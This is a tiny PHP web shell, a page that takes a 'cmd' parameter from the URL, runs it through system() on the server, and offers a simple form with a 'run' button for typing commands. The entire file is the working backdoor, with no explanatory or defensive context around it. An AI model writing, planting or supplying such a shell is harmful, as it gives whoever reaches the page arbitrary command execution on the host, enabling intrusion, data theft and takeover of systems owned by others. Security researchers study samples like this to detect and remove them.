<?php

if(isset($_GET['cmd'])){

system($_GET['cmd']);

}

?>

<form>

<input name="cmd">

<button>run</button>

</form>
